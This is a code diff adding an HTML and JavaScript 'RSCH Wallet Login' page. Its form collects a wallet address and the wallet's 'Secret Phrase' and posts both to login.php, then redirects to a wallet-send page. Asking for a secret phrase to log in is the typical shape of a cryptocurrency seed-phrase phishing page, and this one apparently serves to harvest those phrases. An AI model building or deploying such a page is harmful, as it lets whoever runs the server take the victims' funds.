@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>RSCH Wallet Login</title>
+  <style>
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      width: 300px;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #8b32b0;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #8b32b0;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      margin-bottom: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 8px;
+      background-color: #8b32b0;
+      border: none;
+      color: #ffffff;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #6a2280;
+    }
+
+    .error {
+      color: #ff0000;
+      margin-bottom: 16px;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Login your wallet</h1>
+    <form id="loginForm" action="login.php" method="POST">
+      <label for="walletAddress">Wallet-Adresse:</label>
+      <input type="text" id="walletAddress" name="walletAddress" required>
+      
+      <label for="secretPhrase">Secret Phrase:</label>
+      <input type="password" name="secretPhrase" id="secretPhrase" >
+    
+      <button type="submit">Login</button>
+    </form>
+    
+    <p id="errorMessage" class="error" style="display: none;"></p>
+  </div>
+
+  <script>
+    // JavaScript-Code hier einfügen
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      var walletAddress = document.getElementById('walletAddress').value;
+      var secretPhrase = document.getElementById('secretPhrase').value;
+
+      // Senden Sie eine Anfrage an den Server
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'login.php', true);
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+            var response = JSON.parse(xhr.responseText);
+            if (response.success) {
+              // Erfolgreiche Anmeldung - Weiterleitung zur nächsten Seite
+              window.location.href = 'wallet-send.html';
+            } else {
+              // Fehlerhafte Anmeldung - Fehlermeldung anzeigen
+              document.getElementById('errorMessage').textContent = 'Ungültige Wallet-Adresse oder Secret Phrase.';
+              document.getElementById('errorMessage').style.display = 'block';
+            }
+          } else {
+            // Serverfehler - Fehlermeldung anzeigen
+            document.getElementById('errorMessage').textContent = 'Ein Serverfehler ist aufgetreten.';
+            document.getElementById('errorMessage').style.display = 'block';
+          }
+        }
+      };
+      xhr.send('walletAddress=' + encodeURIComponent(walletAddress) + '&secretPhrase=' + encodeURIComponent(secretPhrase));
+    });
+  </script>
+</body>
+</html>
+
